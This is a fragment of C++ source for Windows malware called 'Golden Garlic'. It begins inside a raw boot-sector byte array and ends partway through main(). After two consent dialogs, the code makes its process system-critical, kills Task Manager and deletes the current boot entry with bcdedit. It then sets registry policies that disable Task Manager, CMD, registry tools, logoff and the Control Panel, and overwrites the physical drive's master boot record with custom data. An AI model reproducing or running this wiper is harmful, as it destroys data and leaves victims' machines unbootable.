x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA,0x8A,0x02,0x3C,0x2C,0x06,0x28,0x06,0x0F,0x00,0x00,0x00,0x00,0x04,0x04,0x00,0x08,0x08,0x00,0x10,0x10,0x00,0x20,0x20,0x00,0x40,0x40,0x40,0x00,0x40,0x80,0x80,0x00,0x41,0x00,0x00,0x01,0x42,0x00,0x00,0x02,0x44,0x00,0x00,0x04,0x48,0x00,0x00,0x08,0x44,0x2F,0x2F,0x04,0x80,0x01,0x41,0x3E,0x3E,0x01,0x81,0x01,0x01,0x41,0x3D,0x41,0x01,0x04,0x40,0x01,0x40,0xD7,0x41,0x01,0x40,0x65,0xD9,0x00,0x40,0xDA,0x40,0x01,0x40,0x64,0xD9,0x00,0x80,0x01,0x06,0xA5,0x01,0x40,0xD9,0x41,0x01,0x40,0x61,0x84,0x02,0x05,0x64,0x00,0x40,0xDF,0x9E,0x04,0x40,0x5A,0xE2,0x00,0x06,0xE3,0x02,0x1B,0xA3,0x01,0x40,0xC1,0xDB,0x03,0x40,0x61,0x41,0x01,0x05,0xBD,0x03,0x18,0x5F,0x00,0x40,0x75,0x1C,0x05,0x29,0x72,0x00,0x24,0x29,0x00,0x07,0xC0,0x00,0x40,0x56,0xC8,0x00,0x08,0x54,0x00,0x19,0x5C,0x00,0x40,0x74,0xDD,0x03,0x25,0xEA,0x00,0x04,0x98,0x00,0x05,0xDD,0x04,0x1D,0x2E,0x00,0x09,0x1D,0x00,0x40,0x57,0x83,0x02,0x08,0x9D,0x01,0x3F,0xCD,0x00,0x40,0x6E,0x36,0x07,0x06,0x37,0x01,0x09,0x99,0x03,0x1D,0x2D,0x00,0x0A,0x41,0x01,0x40,0x76,0x31,0x03,0x40,0x73,0xBF,0x03,0x20,0x40,0x01,0x06,0x38,0x01,0x06,0x78,0x04,0x05,0x3F,0x01,0x27,0xA2,0x00,0x40,0x52,0x8B,0x04,0x22,0x9D,0x01,0x1D,0x74,0x00,0x05,0x79,0x06,0x2F,0x94,0x00,0x23,0x2E,0x00,0x22,0x80,0x02,0x0B,0xB6,0x03,0x07,0x8C,0x02,0x40,0x76,0xA9,0x0E,0x09,0x4F,0x00,0x1B,0x06,0x03,0x1D,0x9B,0x02,0x0C,0xCA,0x00,0x40,0x49,0xDC,0x04,0x22,0x53,0x00,0x0D,0x20,0x00,0x26,0x00,0x05,0x40,0x60,0x4D,0x03,0x17,0x59,0x00,0x1D,0x7F,0x02,0x0A,0x84,0x04,0x40,0x4D,0x11,0x0C,0x22,0x24,0x00,0x0E,0x20,0x00,0x20,0x24,0x03,0x0E,0x39,0x05,0x40,0x56,0x7F,0x07,0x19,0x3F,0x01,0x23,0xDE,0x0B,0x40,0x4E,0x40,0x01,0x25,0xAD,0x09,0x10,0x41,0x01,0x40,0x76,0x10,0x0F,0x0D,0xA8,0x00,0x16,0x59,0x00,0x1D,0x71,0x00,0x09,0x5A,0x09,0x40,0x4C,0x6A,0x0F,0x21,0x52,0x07,0x13,0xAD,0x00,0x1B,0x71,0x01,0x11,0xAB,0x02,0x40,0x56,0x3E,0x01,0x18,0x06,0x01,0x1C,0x3E,0x01,0x33,0xD7,0x06,0x23,0x41,0x01,0x24,0x80,0x02,0x10,0x1F,0x00,0x1B,0x55,0x00,0x11,0x19,0x00,0x40,0x4C,0x41,0x01,0x21,0x58,0x00,0x25,0x59,0x04,0x2B,0x41,0x01,0x23,0x5C,0x02,0x24,0x52,0x05,0x2B,0x40,0x01,0x40,0x5C,0xD0,0x0A,0x25,0x8B,0x04,0x40,0x4C,0x55,0x04,0x25,0x6D,0x08,0x23,0xD0,0x09,0x13,0x40,0x01,0x28,0x04,0x0A,0x40,0x6D,0x10,0x0C,0x1D,0xFD,0x04,0x2D,0xF2,0x00,0x29,0x00,0x02,0x35,0x66,0x0D,0x2B,0x7F,0x09,0x40,0x48,0x3E,0x01,0x27,0x59,0x02,0x25,0x18,0x0F,0x29,0x03,0x0C,0x04,0x26,0x00,0x23,0x40,0x01,0x23,0xE3,0x08,0x37,0x40,0x06,0x40,0x48,0x42,0x06,0x13,0x44,0x00,0x14,0x57,0x00,0x1D,0x9A,0x0A,0x33,0x65,0x10,0x23,0xAA,0x15,0x24,0xDF,0x00,0x12,0x14,0x06,0x2E,0xC3,0x06,0x40,0x69,0x22,0x12,0x40,0x54,0x6D,0x0A,0x1E,0x6C,0x01,0x21,0x8F,0x14,0x31,0xF5,0x03,0x40,0x55,0xC1,0x03,0x15,0x6D,0x02,0x12,0x15,0x00,0x1D,0xBF,0x03,0x31,0xD5,0x01,0x23,0x25,0x00,0x37,0xB1,0x06,0x1A,0x40,0x01,0x14,0x1A,0x00,0x40,0x41,0x42,0x01,0x40,0x43,0x6C,0x05,0x12,0xC3,0x00,0x2A,0xB5,0x04,0x1C,0x96,0x01,0x27,0xFB,0x13,0x3A,0xFF,0x09,0x40,0x46,0x80,0x07,0x25,0xED,0x04,0x1C,0xAC,0x04,0x34,0x40,0x01,0x23,0x54,0x0A,0x28,0x2C,0x16,0x0F,0x17,0x10,0x40,0x96,0x2F,0x20,0x29,0x97,0x0F,0x2F,0x77,0x08,0x22,0x16,0x04,0x40,0x49,0x11,0x09,0x15,0x1C,0x00,0x40,0x83,0xD1,0x19,0x12,0x42,0x03,0x2F,0xF3,0x0F,0x40,0x49,0x24,0x0C,0x32,0x30,0x0A,0x40,0x41,0x81,0x07,0x28,0x6C,0x0A,0x28,0xBE,0x08,0x27,0x1F,0x01,0x0C,0x77,0x00,0x20,0x6C,0x0F,0x2D,0x51,0x0F,0x40,0x6F,0xEF,0x23,0x1A,0xD7,0x04,0x29,0x87,0x0D,0x13,0xB5,0x00,0x40,0x44,0x82,0x0E,0x35,0x4C,0x02,0x1E,0x0F,0x09,0x15,0x41,0x06,0x3C,0x40,0x01,0x1E,0x11,0x15,0x33,0xBD,0x0D,0x34,0x07,0x02,0x31,0xE1,0x0E,0x1B,0xEB,0x12,0x2D,0x26,0x03,0x40,0x42,0x82,0x07,0x1D,0xEB,0x1D,0x3C,0xBF,0x0C,0x22,0x32,0x07,0x0D,0xB2,0x0C,0x1F,0xD1,0x0C,0x25,0x77,0x02,0x31,0xE8,0x0D,0x40,0x44,0x80,0x02,0x27,0x6F,0x00,0x2F,0x4C,0x03,0x40,0x4F,0x56,0x11,0x22,0x80,0x1B,0x07,0xBE,0x1A,0x40,0x8E,0xED,0x28,0x0E,0x40,0x01,0x2E,0x32,0x07,0x23,0x58,0x16,0x39,0x6C,0x14,0x15,0x41,0x01,0x35,0x12,0x1F,0x3E,0xC0,0x12,0x20,0x71,0x00,0x26,0xD7,0x1A,0x16,0xB8,0x00,0x31,0xB3,0x0E,0x1E,0xE9,0x19,0x26,0x81,0x02,0x22,0x29,0x00,0x40,0x4D,0x7D,0x0C,0x2A,0xFE,0x10,0x2A,0x67,0x06,0x27,0x80,0x02,0x10,0xED,0x16,0x1D,0x97,0x0E,0x22,0xFF,0x04,0x07,0xC6,0x01,0x07,0xC3,0x21,0x29,0x0C,0x13,0x40,0x5E,0xEB,0x28,0x23,0x50,0x1A,0x19,0x7E,0x0C,0x2A,0xD9,0x02,0x40,0x43,0x57,0x17,0x0B,0x7A,0x14,0x06,0x4B,0x01,0x24,0x3F,0x1C,0x0A,0xB5,0x02,0x40,0x59,0x3F,0x06,0x36,0xBF,0x0F,0x26,0x97,0x1C,0x20,0xAF,0x02,0x23,0x8E,0x19,0x37,0x31,0x19,0x06,0xE9,0x21,0x33,0xEC,0x1F,0x31,0x26,0x02,0x28,0x77,0x09,0x30,0xFF,0x09,0x13,0x7A,0x00,0x1E,0x2F,0x01,0x2F,0x8D,0x02,0x1A,0x1A,0x01,0x09,0x37,0x01,0x28,0xF2,0x08,0x3B,0xFD,0x04,0x3B,0xAC,0x08,0x30,0x31,0x1B,0x2E,0x77,0x21,0x39,0x81,0x16,0x09,0x62,0x22,0x40,0x40,0x3C,0x01,0x2B,0x56,0x27,0x24,0x78,0x20,0x33,0x3D,0x0B,0x38,0x88,0x0A,0x2A,0x7E,0x13,0x17,0x54,0x0F,0x40,0x42,0xB8,0x03,0x33,0x62,0x0D,0x30,0x4D,0x07,0x35,0xF1,0x00,0x3B,0x09,0x02,0x14,0x90,0x01,0x14,0x14,0x00,0x06,0xB1,0x1A,0x40,0x44,0x20,0x2F,0x26,0x40,0x01,0x2A,0x06,0x1A,0x2F,0xCA,0x1B,0x40,0x76,0xAD,0x14,0x0C,0x4E,0x03,0x40,0x41,0xB5,0x12,0x2B,0x62,0x17,0x20,0xA7,0x07,0x32,0x92,0x26,0x40,0x4E,0x5E,0x01,0x29,0x81,0x0A,0x3D,0xA7,0x16,0x40,0x58,0x3A,0x23,0x32,0xD5,0x0B,0x17,0x1C,0x07,0x38,0xD7,0x00,0x17,0xFF,0x0D,0x40,0x84,0x58,0x16,0x32,0x8D,0x03,0x38,0x79,0x1B,0x08,0x11,0x03,0x18,0x38,0x07,0x40,0x44,0x83,0x0A,0x10,0x69,0x04,0x40,0x61,0x4D,0x33,0x1D,0x4C,0x09,0x17,0x27,0x0F,0x24,0x95,0x1C,0x16,0x9C,0x04,0x2B,0x61,0x14,0x36,0xFA,0x01,0x31,0x28,0x0D,0x40,0x46,0xBC,0x2D,0x2C,0x4C,0x0C,0x27,0x11,0x29,0x1A,0x97,0x02,0x33,0x8D,0x10,0x2A,0xCF,0x07,0x3F,0xE8,0x15,0x38,0x81,0x02,0x40,0x4D,0xB3,0x19,0x1F,0x9D,0x22,0x17,0x39,0x02,0x1E,0x5E,0x0B,0x29,0x6E,0x25,0x40,0x71,0x0D,0x08,0x26,0xA1,0x2C,0x2C,0x2C,0x0A,0x1B,0x1D,0x20,0x18,0xC4,0x03,0x23,0x01,0x32,0x3A,0x3E,0x06,0x40,0x5D,0x82,0x02,0x27,0x6C,0x0A,0x26,0xE9,0x08,0x23,0x33,0x03,0x32,0xF6,0x2F,0x2B,0x14,0x01,0x1B,0x7F,0x02,0x40,0x5E,0x4F,0x38,0x40,0x4D,0xC4,0x01,0x1D,0xAF,0x21,0x40,0x41,0x68,0x18,0x1E,0xB5,0x00,0x19,0xDE,0x02,0x40,0x58,0x85,0x02,0x27,0x09,0x24,0x2D,0x6C,0x1A,0x1D,0xEF,0x22,0x35,0x23,0x1B,0x11,0xC1,0x0B,0x2E,0x91,0x1D,0x40,0x46,0x12,0x0F,0x40,0x40,0x5A,0x29,0x26,0x55,0x0E,0x1F,0xC1,0x2F,0x17,0x1F,0x00,0x22,0xC0,0x17,0x25,0x05,0x04,0x1C,0x58,0x24,0x40,0x7D,0x6E,0x0B,0x0A,0x81,0x36,0x40,0x41,0x40,0x01,0x33,0x21,0x04,0x0D,0x8B,0x1A,0x36,0xBB,0x3C,0x40,0x5E,0x83,0x02,0x28,0x02,0x1B,0x40,0x41,0x11,0x04,0x33,0x36,0x36,0x10,0x53,0x00,0x2B,0xBC,0x2B,0x12,0xE9,0x0A,0x40,0x7C,0x42,0x01,0x35,0xAD,0x11,0x40,0x44,0xC6,0x06,0x0D,0x7B,0x00,0x1C,0x88,0x00,0x21,0x14,0x17,0x40,0xA4,0x5C,0x3F,0x35,0xA3,0x00,0x1B,0xDB,0x00,0x0E,0xE2,0x0B,0x1C,0x44,0x02,0x22,0x87,0x33,0x40,0xF4,0xB8,0x45,0x0B,0x77,0x05,0x21,0x2B,0x2D,0x22,0x49,0x0D,0x40,0xD7,0x42,0x01,0x1B,0x58,0x06,0x09,0xCE,0x18,0x22,0x03,0x06,0x25,0x81,0x02,0x40,0xEE,0x40,0x01,0x0C,0x14,0x1A,0x2F,0xE6,0x2B,0x41,0x08,0xFA,0x4B,0x07,0x80,0x02,0x23,0x3F,0x24,0x40,0x86,0x5A,0x18,0x40,0x95,0x93,0x06,0x27,0x3D,0x09,0x42,0x7D,0x58,0x4E,0x40,0x86,0x13,0x19,0x40,0xBD,0x40,0x01,0x41,0x3F,0x57,0x53,0x41,0x3F,0x40,0x01,0x4D,0x3B,0x95,0x61,0x35,0xC7,0x45,0x41,0x06,0x41,0x01,0x07,0x95,0x26,0x08,0xEC,0x29,0x33,0x55,0x3E,0x40,0xFC,0x3D,0x13,0x0A,0x99,0x18,0x08,0x37,0x35,0x31,0x12,0x01,0x40,0xC5,0xB7,0x13,0x39,0xC5,0x00,0x06,0xD1,0x1E,0x08,0x25,0x26,0x06,0x08,0x00,0x2F,0x8B,0x3D,0x40,0xC5,0x40,0x01,0x38,0x48,0x03,0x11,0xFF,0x00,0x31,0xE7,0x3C,0x40,0xC7,0x37,0x16,0x3A,0xC0,0x03,0x3F,0xD6,0x04,0x40,0xC5,0x3F,0x01,0x39,0xBE,0x03,0x17,0x91,0x26,0x40,0x4B,0x3E,0x36,0x40,0xDC,0x43,0x01,0x1C,0x39,0x20,0x2A,0x60,0x46,0x40,0xFC,0x3F,0x01,0x41,0x40,0x8B,0x6A,0x40,0x41,0xF2,0x26,0x41,0x1B,0xB2,0x1E,0x41,0x21,0x9C,0x02,0x22,0xF0,0x5D,0x40,0xE7,0xFF,0x04,0x36,0xC9,0x04,0x22,0xB9,0x63,0x41,0x3F,0xB1,0x1E,0x40,0xE8,0x41,0x01,0x37,0xEB,0x05,0x40,0x6C,0x1C,0x58,0x40,0xD8,0x3E,0x10,0x40,0x41,0x7E,0x66,0x41,0x1D,0x71,0x22,0x38,0xAC,0x3E,0x41,0x07,0x41,0x01,0x33,0x9C,0x62,0x40,0xED,0x7E,0x11,0x40,0x4E,0x47,0x56,0x40,0xF2,0x40,0x10,0x23,0x40,0x01,0x40,0x54,0x80,0x61,0x41,0x0D,0x71,0x27,0x40,0xFA,0x3E,0x10,0x40,0x44,0xF2,0x2E,0x40,0xC8,0xFD,0x18,0x40,0x5B,0x76,0x01,0x41,0x1A,0x23,0x0F,0x38,0x40,0x50,0x41,0x06,0x3C,0x15,0x40,0x44,0x40,0x01,0x40,0xC9,0x3F,0x01,0x40,0x5A,0x00,0x05,0x40,0xE5,0xDF,0x08,0x40,0x5C,0x80,0x02,0x40,0xE5,0xE5,0x04,0x37,0x9A,0x5A,0x40,0x40,0x41,0x06,0x40,0xC8,0xBC,0x1C,0x37,0x40,0x01,0x3E,0x19,0x48,0x40,0xCB,0xE2,0x12,0x38,0xBE,0x0D,0x27,0x80,0x02,0x1C,0x73,0x3F,0x40,0xFD,0xBF,0x12,0x40,0x41,0x9E,0x01,0x40,0xC8,0x80,0x02,0x40,0x5C,0x80,0x07,0x1F,0x13,0x4B,0x40,0xFC,0x40,0x01,0x40,0x42,0x81,0x02,0x40,0xFE,0xBD,0x26,0x41,0x07,0x3F,0x06,0x38,0x3D,0x24,0x40,0xF2,0x29,0x0B,0x40,0x4C,0x40,0x01,0x2C,0xE3,0x22,0x18,0xA5,0x25,0x40,0xFC,0x7D,0x2A,0x2D,0x49,0x79,0x40,0xDF,0xC0,0x0D,0x40,0x5E,0x40,0x0B,0x40,0xE1,0x40,0x10,0x41,0x40,0x48,0x25,0x40,0x61,0xF6,0x03,0x33,0xEF,0x7F,0x40,0xAE,0xBF,0x03,0x40,0x4E,0x47,0x7B,0x27,0x06,0x68,0x41,0x00,0x0A,0x1A,0x3D,0x43,0x6E,0x41,0x03,0xFF,0x13,0x40,0x57,0x33,0x57,0x41,0x13,0xC1,0x08,0x2C,0x05,0x65,0x41,0x09,0x3F,0x24,0x41,0x20,0xC0,0x17,0x40,0x41,0xC1,0x0D,0x40,0xFF,0x3F,0x01,0x2B,0x81,0x02,0x40,0xDD,0x3F,0x01,0x3B,0x80,0x07,0x3D,0xC4,0x75,0x40,0xFF,0xFF,0x1D,0x2D,0x79,0x01,0x16,0xEF,0x64,0x40,0xFD,0x00,0x0F,0x40,0x41,0x01,0x0A,0x40,0xCB,0x40,0x01,0x40,0x62,0xBA,0x07,0x35,0x07,0x72,0x40,0xE1,0x7A,0x50,0x3C,0xC4,0x04,0x40,0xCA,0xB4,0x10,0x40,0x5B,0x64,0x78,0x2F,0x04,0x6F,0x40,0xF2,0xC0,0x12,0x3B,0xC4,0x21,0x40,0xC9,0x81,0x02,0x34,0xB7,0x40,0x40,0x43,0x07,0x01,0x40,0xCA,0xC0,0x03,0x08,0xF3,0x75,0x40,0x56,0x29,0x77,0x40,0xDF,0xFE,0x13,0x0F,0xC0,0x03,0x34,0x31,0x68,0x34,0xF5,0x68,0x40,0xCD,0x3B,0x2E,0x0E,0x1F,0x63,0x2F,0x80,0x76,0x1F,0x87,0x07,0x37,0xB6,0x67,0x40,0xAC,0x5F,0x01,0x17,0x11,0x7A,0x0C,0x95,0x02,0x23,0x6B,0x39,0x16,0xE3,0x09,0x18,0x67,0x0C,0x1D,0x3B,0x41,0x07,0x30,0x60,0x40,0xCA,0x55,0x33,0x24,0xBD,0x5F,0x0D,0xA9,0x63,0x09,0x32,0x62,0x30,0xCA,0x48,0x07,0x80,0x76,0x40,0xC2,0x2D,0x61,0x09,0x56,0x48,0x2A,0xDC,0x60,0x06,0x2F,0x00,0x0B,0x40,0x7B,0x1C,0xD8,0x07,0x09,0x54,0x00,0x09,0x67,0x01,0x0B,0x2B,0x60,0x40,0xC9,0x6C,0x62,0x06,0x9A,0x07,0x2C,0xE9,0x6C,0x07,0x92,0x48,0x20,0x00,0x75,0x08,0x94,0x6A,0x05,0x35,0x00,0x0A,0x27,0x65,0x08,0x70,0x00,0x40,0xCF,0xFF,0x60,0x2A,0x85,0x72,0x09,0x15,0x01,0x1F,0x34,0x00,0x09,0xD2,0x76,0x15,0xBA,0x06,0x40,0xCD,0x90,0x1E,0x35,0x11,0x02,0x26,0xA9,0x75,0x07,0x58,0x00,0x40,0xE1,0xBF,0x1F,0x40,0x52,0xE1,0x00,0x0A,0x99,0x07,0x4E,0x3D,0xB8,0x5E,0x4E,0x3C,0x3C,0x0E,0x5C,0x78,0x78,0x1C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);
BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}
BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI KillMBR(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 3072, &dwBytesWritten, 0);
	return 1;
}
void reg_addition(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value)//credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition
	);
	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);
	RegCloseKey(hKey);
	return;
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	if (MessageBoxA(NULL, "Warning! This program is a malware that known as 'Golden Garlic'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the running. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Golden Garlic.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		UnhookWindowsHookEx(hMsgHookA);
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
		HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to run this? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The author of this computer virus(LambdaTechnology) is NOT responsible!!!", L"Golden Garlic.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			UnhookWindowsHookEx(hMsgHookA);
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			system("taskkill /f /im taskmgr.exe");
			system("bcdedit /delete {current}");
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", L"NoRun", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", L"NoControlPanel", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableLockWorkstation", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"NoLogoff", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableChangePassword", REG_DWORD, 1);
			reg_addition(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"HideFastUserSwiching", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 1);
			CreateThread(0, 0, KillMBR, 0, 0, 0);
			Sleep(5000);
